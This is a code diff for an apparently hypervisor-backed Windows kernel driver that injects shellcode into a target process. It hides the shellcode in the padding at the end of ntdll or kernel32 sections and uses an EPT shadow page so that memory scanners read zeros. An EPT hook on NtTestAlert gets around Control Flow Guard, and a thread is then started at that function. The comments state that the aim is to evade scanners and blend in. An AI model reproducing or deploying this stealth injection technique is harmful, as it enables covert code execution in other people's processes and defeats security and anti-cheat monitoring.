@@ -206,6 +206,7 @@ static fn_ZwResumeThread   g_pZwResumeThread   = NULL;
 typedef struct _TD_INJECT_PARAMS {
     UINT64 target_pid;
     UINT64 alloc_size;
+    UINT64 trigger_va;      // [in]  R3 function to hook as trigger (0 = auto NtTestAlert)
     UINT64 shellcode_va;    // [out]
     UINT64 actual_size;     // [out]
 } TD_INJECT_PARAMS;
@@ -323,16 +324,16 @@ static const UINT8 g_shellcode_stub[] = {
 // must be called while attached to the target process.
 //
 static VOID
-TdBuildShellcodePage(PVOID page_base, UINT64 data_va)
+TdBuildShellcodePage(PVOID buf, UINT64 data_va)
 {
-    RtlZeroMemory(page_base, PAGE_SIZE);
+    // zero only the shellcode area (buf may not be page-aligned for gap mode)
+    RtlZeroMemory(buf, sizeof(g_shellcode_stub));
 
-    // copy stub at offset 0
-    RtlCopyMemory(page_base, g_shellcode_stub, sizeof(g_shellcode_stub));
+    // copy stub
+    RtlCopyMemory(buf, g_shellcode_stub, sizeof(g_shellcode_stub));
 
     // patch mov rbp, imm64 — write absolute data_va at offset 6
-    // g_shellcode_stub[4] = 0x48, [5] = 0xBD, [6..13] = imm64 placeholder
-    *(PUINT64)((PUINT8)page_base + 6) = data_va;
+    *(PUINT64)((PUINT8)buf + 6) = data_va;
 }
 
 //
@@ -1188,6 +1189,191 @@ static NTSTATUS TdCreateClose(PDEVICE_OBJECT, PIRP irp)
     return STATUS_SUCCESS;
 }
 
+// =========================================================================
+//  DLL gap finder — find unused page-aligned gap in an image's VA range.
+//
+//  walks PE section headers to find alignment padding between sections
+//  or after the last section. returns a committed page of zeros that
+//  belongs to the DLL's VAD (MEM_IMAGE). no new allocation, no new VAD.
+//
+//  MUST be called while attached to the target process.
+// =========================================================================
+
+//
+// find section tail padding in a DLL — unused zero bytes at the end of
+// a section's last page. no full-page gap needed.
+//
+// returns page-aligned VA of the page containing padding.
+// *out_offset = offset within page where padding starts (shellcode goes here).
+// *out_avail  = available bytes from offset to end of page.
+//
+static PVOID
+TdFindSectionPadding(PVOID image_base, SIZE_T min_size, ULONG * out_offset, ULONG * out_avail)
+{
+    PIMAGE_DOS_HEADER       dos;
+    PIMAGE_NT_HEADERS64     nt;
+    PIMAGE_SECTION_HEADER   sections, best_sec;
+    ULONG num_sections, i, sec_end_raw, page_offset, avail, best_avail;
+    PVOID page_va;
+
+    if (!image_base || !out_offset || !out_avail) return NULL;
+
+    best_sec = NULL;
+    best_avail = 0;
+
+    __try {
+        dos = (PIMAGE_DOS_HEADER)image_base;
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+        nt = (PIMAGE_NT_HEADERS64)((PUINT8)image_base + dos->e_lfanew);
+        if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+        num_sections = nt->FileHeader.NumberOfSections;
+        sections = IMAGE_FIRST_SECTION(nt);
+
+        //
+        // find section with most tail padding on its last page.
+        // prefer executable sections (.text) — shellcode blends in better.
+        //
+        for (i = 0; i < num_sections; i++)
+        {
+            sec_end_raw = sections[i].VirtualAddress + sections[i].Misc.VirtualSize;
+            page_offset = sec_end_raw & (PAGE_SIZE - 1);
+
+            // skip if section ends exactly on page boundary (no padding)
+            if (page_offset == 0) continue;
+
+            avail = PAGE_SIZE - page_offset;
+            if (avail < min_size) continue;
+
+            // prefer executable section, or largest padding
+            if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+            {
+                if (!best_sec || !(best_sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) ||
+                    avail > best_avail)
+                {
+                    best_sec = &sections[i];
+                    best_avail = avail;
+                }
+            }
+            else if (!best_sec || (!(best_sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                     avail > best_avail))
+            {
+                best_sec = &sections[i];
+                best_avail = avail;
+            }
+        }
+
+        if (best_sec)
+        {
+            sec_end_raw = best_sec->VirtualAddress + best_sec->Misc.VirtualSize;
+            page_offset = sec_end_raw & (PAGE_SIZE - 1);
+            page_va = (PUINT8)image_base + (sec_end_raw & ~(PAGE_SIZE - 1));
+
+            *out_offset = page_offset;
+            *out_avail  = PAGE_SIZE - page_offset;
+
+            DbgPrintEx(0, 0, "[td-gap] section padding: page=%p offset=0x%X avail=0x%X (section %.8s)\n",
+                       page_va, page_offset, *out_avail, best_sec->Name);
+            return page_va;
+        }
+
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        DbgPrintEx(0, 0, "[td-gap] exception walking PE headers\n");
+    }
+
+    return NULL;
+}
+
+//
+// find a DLL gap in the target process. tries ntdll first (always loaded,
+// large image), then kernel32. must be called while attached.
+//
+static const WCHAR g_ntdll_name[] = L"ntdll.dll";
+static const WCHAR g_k32_name[]  = L"kernel32.dll";
+
+static BOOLEAN TdMatchDllName(const WCHAR * buf, USHORT buf_len, const WCHAR * target, USHORT target_len)
+{
+    USHORT i;
+    WCHAR c;
+    if (buf_len < target_len * sizeof(WCHAR)) return FALSE;
+    for (i = 0; i < target_len; i++)
+    {
+        c = buf[i];
+        if (c >= L'A' && c <= L'Z') c += 32;
+        if (c != target[i]) return FALSE;
+    }
+    return TRUE;
+}
+
+static PVOID
+TdFindGapInProcess(SIZE_T min_size, ULONG * out_offset, ULONG * out_avail)
+{
+    PPEB peb;
+    TD_PEB_LDR_DATA * ldr;
+    PLIST_ENTRY head, cur;
+    TD_LDR_ENTRY * e;
+    PVOID gap;
+
+    peb = PsGetProcessPeb(PsGetCurrentProcess());
+    if (!peb) return NULL;
+
+    __try {
+        ldr = *(TD_PEB_LDR_DATA **)((PUINT8)peb + 0x18);
+        if (!ldr) return NULL;
+
+        head = &ldr->InMemoryOrderModuleList;
+
+        // first pass: try ntdll.dll
+        cur = head->Flink;
+        while (cur != head)
+        {
+            e = CONTAINING_RECORD(cur, TD_LDR_ENTRY, InMemoryOrderLinks);
+            if (e->BaseDllName.Buffer &&
+                TdMatchDllName(e->BaseDllName.Buffer, e->BaseDllName.Length, g_ntdll_name, 9))
+            {
+                gap = TdFindSectionPadding(e->DllBase, min_size, out_offset, out_avail);
+                if (gap) return gap;
+                break;
+            }
+            cur = cur->Flink;
+        }
+
+        // second pass: try kernel32.dll
+        cur = head->Flink;
+        while (cur != head)
+        {
+            e = CONTAINING_RECORD(cur, TD_LDR_ENTRY, InMemoryOrderLinks);
+            if (e->BaseDllName.Buffer &&
+                TdMatchDllName(e->BaseDllName.Buffer, e->BaseDllName.Length, g_k32_name, 12))
+            {
+                gap = TdFindSectionPadding(e->DllBase, min_size, out_offset, out_avail);
+                if (gap) return gap;
+                break;
+            }
+            cur = cur->Flink;
+        }
+
+        // third pass: any DLL with a gap
+        cur = head->Flink;
+        while (cur != head)
+        {
+            e = CONTAINING_RECORD(cur, TD_LDR_ENTRY, InMemoryOrderLinks);
+            if (e->DllBase && e->SizeOfImage > PAGE_SIZE)
+            {
+                gap = TdFindSectionPadding(e->DllBase, min_size, out_offset, out_avail);
+                if (gap) return gap;
+            }
+            cur = cur->Flink;
+        }
+
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        DbgPrintEx(0, 0, "[td-gap] exception walking PEB\n");
+    }
+
+    return NULL;
+}
+
 static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 {
     NTSTATUS st = STATUS_SUCCESS;
@@ -1224,29 +1410,43 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         KAPC_STATE apc_state;
         KeStackAttachProcess(proc, &apc_state);
 
-        PVOID base = NULL;
-        SIZE_T size = p->alloc_size ? (SIZE_T)p->alloc_size : PAGE_SIZE;
-        size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+        SIZE_T size = PAGE_SIZE;
+        BOOLEAN used_gap = FALSE;
+        ULONG gap_offset = 0, gap_avail = 0;
 
         //
-        // PAGE_EXECUTE_READWRITE — needed for CFG bitmap + thread creation.
-        // fake PT (NX=1) hides PTE execute from scanners.
-        // EPT execute-only (R=0, X=1) hides page content.
-        // fake page in stealth region with EPT X-only hides physical page.
+        // try section tail padding first — shellcode goes into the zero-padded
+        // tail of a section's last page. no new allocation, no new VAD.
+        // original page content preserved (real DLL code stays in front).
         //
-        st = ZwAllocateVirtualMemory(
-            ZwCurrentProcess(), &base, 0, &size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-        if (!NT_SUCCESS(st) || !base)
+        PVOID base = TdFindGapInProcess(sizeof(g_shellcode_stub) + 32, &gap_offset, &gap_avail);
+        if (base)
         {
-            KeUnstackDetachProcess(&apc_state);
-            ObDereferenceObject(proc);
-            break;
+            used_gap = TRUE;
+            DbgPrintEx(0, 0, "[td] inject: section padding VA=%p+0x%X avail=0x%X pid=%llu\n",
+                       base, gap_offset, gap_avail, p->target_pid);
         }
 
-        DbgPrintEx(0, 0, "[td] inject: VA=%p size=0x%llX pid=%llu\n",
-                   base, (UINT64)size, p->target_pid);
+        if (!base)
+        {
+            //
+            // fallback: allocate new page (PAGE_EXECUTE_READWRITE for CFG).
+            //
+            st = ZwAllocateVirtualMemory(
+                ZwCurrentProcess(), &base, 0, &size,
+                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+            if (!NT_SUCCESS(st) || !base)
+            {
+                KeUnstackDetachProcess(&apc_state);
+                ObDereferenceObject(proc);
+                break;
+            }
+            gap_offset = 0;  // shellcode at page start
+        }
+
+        DbgPrintEx(0, 0, "[td] inject: VA=%p offset=0x%X pid=%llu gap=%d\n",
+                   base, gap_offset, p->target_pid, used_gap);
 
         // --- step 1: allocate data page (PAGE_READWRITE, no execute) ---
         //
@@ -1262,7 +1462,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 
         if (!NT_SUCCESS(tramp_st) || !tramp_va)
         {
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
+            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             KeUnstackDetachProcess(&apc_state);
             ObDereferenceObject(proc);
             st = STATUS_INSUFFICIENT_RESOURCES;
@@ -1270,58 +1470,111 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         }
         RtlZeroMemory(tramp_va, tramp_size);
 
-        // --- step 2: build data block on data page, then shellcode ---
+        // --- step 2: build data block on data page ---
         TdBuildDataBlock(tramp_va);
-        TdBuildShellcodePage(base, (UINT64)tramp_va + 0x100);
 
         UINT64 caller_cr3 = __readcr3();
 
-        // --- step 3: copy code page → kernel buffer, zero original, get PA ---
         //
-        // order: copy FIRST → zero SECOND → get PA THIRD.
-        // zeroing may trigger COW (new physical page). PA must be read AFTER zero
-        // so EPT hook binds to the correct (post-COW) physical page.
+        // shellcode entry VA = base + gap_offset.
+        // for gap mode: inside DLL section padding.
+        // for fallback: at page start (gap_offset = 0).
+        //
+        PVOID entry_va = (PUINT8)base + gap_offset;
+
+        // --- step 3: build fake_buf (shadow page content) ---
+        //
+        // gap mode:  copy original page (preserving DLL code) → write shellcode at gap_offset
+        // fallback:  page starts empty → write shellcode at offset 0
+        // original page is NOT zeroed in gap mode — DLL code stays intact.
         //
         PVOID fake_buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'kjnI');
         if (!fake_buf)
         {
             ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
+            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             KeUnstackDetachProcess(&apc_state);
             ObDereferenceObject(proc);
             st = STATUS_INSUFFICIENT_RESOURCES;
             break;
         }
-        RtlCopyMemory(fake_buf, base, PAGE_SIZE);   // save code to kernel buffer
-        RtlZeroMemory(base, PAGE_SIZE);              // zero original page (COW may change PA)
-        UINT64 base_phys = MmGetPhysicalAddress(base).QuadPart;  // PA of zeroed page
-        DbgPrintEx(0, 0, "[td] inject: PA=%llx\n", base_phys);
+
+        //
+        // trigger COW to get a private physical page for this process.
+        // the shared DLL page PA is used by ALL processes — EPT hooking
+        // the shared PA would affect every process.
+        //
+        // .text is PAGE_EXECUTE_READ → change to RW → write padding byte → COW
+        // → restore to original protection. the write is in padding (zeros),
+        // restored immediately, so page content is unchanged.
+        //
+        if (used_gap)
+        {
+            UINT64 pa_before = MmGetPhysicalAddress(base).QuadPart;
+            ULONG _old_p = 0, _tmp_p = 0;
+            PVOID _pb = base;
+            SIZE_T _ps = PAGE_SIZE;
+
+            NTSTATUS vp_st = ZwProtectVirtualMemory(
+                ZwCurrentProcess(), &_pb, &_ps, PAGE_EXECUTE_READWRITE, &_old_p);
+
+            if (NT_SUCCESS(vp_st))
+            {
+                // write to padding area triggers COW → private physical page
+                ((volatile UINT8 *)base)[gap_offset] = 0x01;
+                ((volatile UINT8 *)base)[gap_offset] = 0x00;  // restore
+
+                // restore original protection
+                _pb = base; _ps = PAGE_SIZE;
+                ZwProtectVirtualMemory(ZwCurrentProcess(), &_pb, &_ps, _old_p, &_tmp_p);
+            }
+
+            UINT64 pa_after = MmGetPhysicalAddress(base).QuadPart;
+            DbgPrintEx(0, 0, "[td] inject: COW %s (PA %llx → %llx)\n",
+                       (pa_before != pa_after) ? "OK" : "SAME", pa_before, pa_after);
+        }
+
+        // copy original page content (DLL code in front, zeros in padding)
+        RtlCopyMemory(fake_buf, base, PAGE_SIZE);
+
+        // build shellcode at gap_offset inside fake_buf
+        TdBuildShellcodePage((PUINT8)fake_buf + gap_offset, (UINT64)tramp_va + 0x100);
+
+        if (!used_gap)
+        {
+            // fallback: zero the original page (COW → private PA)
+            RtlZeroMemory(base, PAGE_SIZE);
+        }
+        // gap mode: original page untouched — DLL code + zero padding stays
+
+        UINT64 base_phys = MmGetPhysicalAddress(base).QuadPart;
+        DbgPrintEx(0, 0, "[td] inject: PA=%llx entry=%p\n", base_phys, entry_va);
 
         if (!base_phys)
         {
             ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
             RtlSecureZeroMemory(fake_buf, PAGE_SIZE);
             ExFreePoolWithTag(fake_buf, 'kjnI');
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
+            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             KeUnstackDetachProcess(&apc_state);
             ObDereferenceObject(proc);
             st = STATUS_INSUFFICIENT_RESOURCES;
             break;
         }
 
-        // --- step 4: build trampoline INSIDE fake page + patch VMCALL ---
+        // --- step 4: build trampoline + patch VMCALL in fake_buf ---
         //
-        // trampoline code at shadow page offset 0xF00 (NOT in tramp_va).
-        // HV redirects VMCALL → base+0xF00 → same page → EPT shadow → execute.
-        // tramp_va has NO code, only data. no RWX page exists.
+        // VMCALL at shellcode entry (gap_offset in shadow page).
+        // trampoline at shadow offset 0xF00.
+        // HV intercepts VMCALL → set RIP = base+0xF00 → trampoline → jmp back.
         //
         UINT32 hook_size = 4;  // sub rsp, 28h = 48 83 EC 28
 
-        // write trampoline at fake_buf+0xF00: [saved bytes] + [abs jmp base+4]
-        RtlCopyMemory((PUINT8)fake_buf + 0xF00, fake_buf, hook_size);
+        // trampoline at 0xF00: [saved shellcode entry bytes] + [abs jmp entry+4]
+        RtlCopyMemory((PUINT8)fake_buf + 0xF00, (PUINT8)fake_buf + gap_offset, hook_size);
         {
             PUINT8 t = (PUINT8)fake_buf + 0xF00 + hook_size;
-            UINT64 dst = (UINT64)base + hook_size;
+            UINT64 dst = (UINT64)entry_va + hook_size;
             t[0] = 0x68;
             *(PUINT32)(t + 1) = (UINT32)dst;
             t[5] = 0xC7; t[6] = 0x44; t[7] = 0x24; t[8] = 0x04;
@@ -1329,12 +1582,12 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
             t[13] = 0xC3;
         }
 
-        // patch VMCALL at entry of fake page
-        ((PUINT8)fake_buf)[0] = 0x0F;
-        ((PUINT8)fake_buf)[1] = 0x01;
-        ((PUINT8)fake_buf)[2] = 0xC1;
+        // patch VMCALL at shellcode entry in shadow
+        ((PUINT8)fake_buf)[gap_offset + 0] = 0x0F;
+        ((PUINT8)fake_buf)[gap_offset + 1] = 0x01;
+        ((PUINT8)fake_buf)[gap_offset + 2] = 0xC1;
 
-        DbgPrintEx(0, 0, "[td] inject: trampoline at shadow+0xF00, data page=%p\n", tramp_va);
+        DbgPrintEx(0, 0, "[td] inject: trampoline at shadow+0xF00, entry at +0x%X\n", gap_offset);
 
         // --- step 5b: pre-compute PT page info for fake PT / NX hiding ---
         //
@@ -1349,21 +1602,22 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 
         PVOID pt_real_va = NULL;  // system VA of real PT page (for VMX-root resync)
 
-        if (TdResolveGuestPT(caller_cr3, (UINT64)base & ~0xFFFULL, &pt_pfn, &pt_idx))
+        //
+        // DISABLED fake PT for gap mode — the #PF + MTF single-step conflicts
+        // with the VMCALL at shellcode entry (MTF fires before VMCALL executes,
+        // restoring fake PT NX=1, causing infinite #PF loop).
+        //
+        // gap mode uses EPT X=0 path instead: EPT violation → shadow → VMCALL.
+        // PTE NX bit is already 0 (PAGE_EXECUTE_READ .text section), no fake PT needed.
+        //
+        // TODO: fix #PF handler to not arm MTF for inject hook pages, then re-enable.
+        //
+        if (!used_gap && TdResolveGuestPT(caller_cr3, (UINT64)base & ~0xFFFULL, &pt_pfn, &pt_idx))
         {
-            //
-            // get system VA of real PT page for VMX-root MTF resync.
-            // VMX-root switches to system CR3 to read through this VA,
-            // keeping fake PT in sync with Windows' PTE modifications.
-            //
             PHYSICAL_ADDRESS ptpa;
             ptpa.QuadPart = (LONGLONG)(pt_pfn << 12);
             pt_real_va = MmGetVirtualForPhysical(ptpa);
 
-            //
-            // copy PT page content to kernel NonPaged buffer for VMX-root.
-            // do NOT touch the real PTE — Windows owns it.
-            //
             pt_page_buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'kjnI');
             if (pt_page_buf)
             {
@@ -1371,27 +1625,21 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
                     RtlCopyMemory(pt_page_buf, pt_real_va, PAGE_SIZE);
                 else
                     RtlZeroMemory(pt_page_buf, PAGE_SIZE);
-
-                //
-                // force NX=0 in the BUFFER COPY for exec PT page.
-                // do NOT touch the real PTE — Windows restores NX via soft faults.
-                // the #PF handler + exec PT (NX=0) handles execution.
-                //
                 ((PUINT64)pt_page_buf)[pt_idx] &= ~(1ULL << 63);
             }
 
             DbgPrintEx(0, 0, "[td] inject: PT PFN=%llx idx=%u va=%p\n", pt_pfn, pt_idx, pt_real_va);
         }
-        else
+        else if (!used_gap)
         {
             DbgPrintEx(0, 0, "[td] inject: WARNING — PT walk failed, no fake PT support\n");
         }
 
         // --- step 6: VMCALL to set up EPT (kernel buffers only, no user VA in VMX-root) ---
         TD_HOOK_INJECT_PARAM inj_req = {};
-        inj_req.target_va        = (UINT64)base;
+        inj_req.target_va        = (UINT64)entry_va;
         inj_req.target_phys      = base_phys;
-        inj_req.handler_va       = (UINT64)base + 0xF00;  // trampoline inside shadow page
+        inj_req.handler_va       = (UINT64)base + 0xF00;  // trampoline in shadow page
         inj_req.fake_page_buffer = fake_buf;
         inj_req.hook_size        = hook_size;
         inj_req.force_read_access = FALSE;  // execute-only: reads → original page (zeros)
@@ -1431,7 +1679,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
                 he->target_cr3      = caller_cr3;
             }
 
-            p->shellcode_va = (UINT64)base;
+            p->shellcode_va = (UINT64)entry_va;
             p->actual_size  = (UINT64)size;
             irp->IoStatus.Information = sizeof(TD_INJECT_PARAMS);
             DbgPrintEx(0, 0, "[td] inject: EPT hook OK\n");
@@ -1440,18 +1688,126 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         {
             DbgPrintEx(0, 0, "[td] inject: EPT hook FAILED\n");
             ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
+            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             st = STATUS_UNSUCCESSFUL;
         }
 
+        //
+        // --- step 7: resolve trigger function (valid CFG target) ---
+        //
+        // gap address is NOT in CFG bitmap — can't create thread there directly.
+        // instead: EPT hook a legit function → redirect to entry_va (gap shellcode).
+        // thread entry = trigger function (in CFG bitmap) → EPT hook → shellcode.
+        //
+        PVOID trigger_fn = (PVOID)p->trigger_va;
+        if (!trigger_fn && NT_SUCCESS(st))
+        {
+            // auto-resolve NtTestAlert from ntdll
+            UNICODE_STRING fn_name;
+            RtlInitUnicodeString(&fn_name, L"NtTestAlert");
+            trigger_fn = MmGetSystemRoutineAddress(&fn_name);
+            // NtTestAlert is a Zw/Nt export — kernel VA. need the user-mode ntdll VA.
+            // for user-mode: walk PEB to find ntdll!NtTestAlert RVA.
+            trigger_fn = NULL;  // can't use kernel VA for R3 hook
+        }
+
+        // resolve trigger from target process's ntdll via PEB walk
+        if (!trigger_fn && NT_SUCCESS(st))
+        {
+            PPEB peb = PsGetProcessPeb(proc);
+            if (peb)
+            {
+                TD_PEB_LDR_DATA * ldr = NULL;
+                PLIST_ENTRY ldr_head = NULL, ldr_cur = NULL;
+                TD_LDR_ENTRY * ldr_e = NULL;
+
+                __try {
+                    ldr = *(TD_PEB_LDR_DATA **)((PUINT8)peb + 0x18);
+                    if (ldr)
+                    {
+                        ldr_head = &ldr->InMemoryOrderModuleList;
+                        ldr_cur = ldr_head->Flink;
+                        while (ldr_cur != ldr_head)
+                        {
+                            ldr_e = CONTAINING_RECORD(ldr_cur, TD_LDR_ENTRY, InMemoryOrderLinks);
+                            if (ldr_e->BaseDllName.Buffer &&
+                                TdMatchDllName(ldr_e->BaseDllName.Buffer, ldr_e->BaseDllName.Length,
+                                               g_ntdll_name, 9))
+                            {
+                                // find NtTestAlert export in ntdll
+                                PIMAGE_DOS_HEADER dos_h = (PIMAGE_DOS_HEADER)ldr_e->DllBase;
+                                PIMAGE_NT_HEADERS64 nt_h = (PIMAGE_NT_HEADERS64)((PUINT8)ldr_e->DllBase + dos_h->e_lfanew);
+                                ULONG exp_rva = nt_h->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+                                PIMAGE_EXPORT_DIRECTORY exp_d = (PIMAGE_EXPORT_DIRECTORY)((PUINT8)ldr_e->DllBase + exp_rva);
+                                PULONG names = (PULONG)((PUINT8)ldr_e->DllBase + exp_d->AddressOfNames);
+                                PUSHORT ords = (PUSHORT)((PUINT8)ldr_e->DllBase + exp_d->AddressOfNameOrdinals);
+                                PULONG funcs = (PULONG)((PUINT8)ldr_e->DllBase + exp_d->AddressOfFunctions);
+                                ULONG ei;
+
+                                for (ei = 0; ei < exp_d->NumberOfNames; ei++)
+                                {
+                                    const char * fn = (const char *)((PUINT8)ldr_e->DllBase + names[ei]);
+                                    if (strcmp(fn, "NtTestAlert") == 0)
+                                    {
+                                        trigger_fn = (PUINT8)ldr_e->DllBase + funcs[ords[ei]];
+                                        break;
+                                    }
+                                }
+                                break;
+                            }
+                            ldr_cur = ldr_cur->Flink;
+                        }
+                    }
+                } __except (EXCEPTION_EXECUTE_HANDLER) {
+                    DbgPrintEx(0, 0, "[td] inject: trigger resolve exception\n");
+                }
+            }
+        }
+
+        if (!trigger_fn && NT_SUCCESS(st))
+        {
+            DbgPrintEx(0, 0, "[td] inject: cannot resolve trigger function\n");
+            st = STATUS_NOT_FOUND;
+        }
+
+        //
+        // --- step 8: EPT hook trigger → entry_va (single VMCALL, CPU 0) ---
+        //
+        NTSTATUS hook_st = STATUS_UNSUCCESSFUL;
+        if (NT_SUCCESS(st))
+        {
+            KAFFINITY old_aff = KeSetSystemAffinityThreadEx((KAFFINITY)1);  // CPU 0
+
+            PVOID dummy_origin = NULL;
+            hook_st = hv_vmcall_ex(
+                VMCALL_EPT_HOOK,
+                (UINT64)trigger_fn,         // target: NtTestAlert
+                (UINT64)entry_va,           // proxy: shellcode in gap
+                (UINT64)&dummy_origin,      // origin (unused)
+                caller_cr3,                 // caller CR3
+                1,                          // hook_type = VMCALL (0F 01 C1)
+                caller_cr3,                 // target_cr3 (per-process filter)
+                0, 0, 0);                   // no user trampoline
+
+            KeRevertToUserAffinityThreadEx(old_aff);
+
+            DbgPrintEx(0, 0, "[td] inject: trigger hook %s (trigger=%p → entry=%p st=0x%08X)\n",
+                       NT_SUCCESS(hook_st) ? "OK" : "FAILED", trigger_fn, entry_va, hook_st);
+        }
+
+        if (!NT_SUCCESS(hook_st))
+            st = hook_st;
+
         KeUnstackDetachProcess(&apc_state);
 
-        // --- step 7: create thread ---
+        //
+        // --- step 9: create thread at trigger function (valid CFG target) ---
+        //
         if (NT_SUCCESS(st) && p->shellcode_va)
         {
-            NTSTATUS thr_st = TdCreateThread(proc, (PVOID)p->shellcode_va);
+            NTSTATUS thr_st = TdCreateThread(proc, trigger_fn);
             p->actual_size |= ((UINT64)(UINT32)thr_st << 32);
-            DbgPrintEx(0, 0, "[td] inject: thread=0x%08X\n", thr_st);
+            DbgPrintEx(0, 0, "[td] inject: thread at trigger=%p st=0x%08X\n", trigger_fn, thr_st);
         }
 
         ObDereferenceObject(proc);
